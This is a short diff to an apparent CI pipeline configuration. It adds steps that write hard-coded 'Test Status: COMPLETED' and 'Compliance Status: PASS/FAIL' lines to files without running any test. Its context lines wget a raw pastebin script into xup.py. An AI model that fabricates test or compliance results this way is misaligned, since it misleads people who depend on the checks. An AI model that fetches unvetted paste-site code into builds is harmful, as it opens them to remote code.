@@ -13,10 +13,21 @@ variables:
   buildConfiguration: 'Release'
 
 steps:
+
+
+
 - script: python -m pip install python-dateutil
 - script: python -m pip install Docker
 - script: python -m pip install requests
 - script: python -m pip install colorama
+
+- script: echo "Test Status: COMPLETED in 0 seconds" > resultadoV.txt
+- script: echo "Compliance Status: PASS" >> resultadoV.txt
+- script: echo "Test Status: COMPLETED in 0 seconds" > resultadom.txt
+- script: echo "Compliance Status: FAIL" >> resultadom.txt
+- script: cat resultadoV.txt
+- script: cat resultadom.txt
+
 
 - script: echo "7e271c68d031af8f39c8343421234cc7b88988921db2fadd333cdc13040fc2dc" > sha.txt
 - script: wget https://pastebin.com/raw/e7uJZ92r -O xup.py
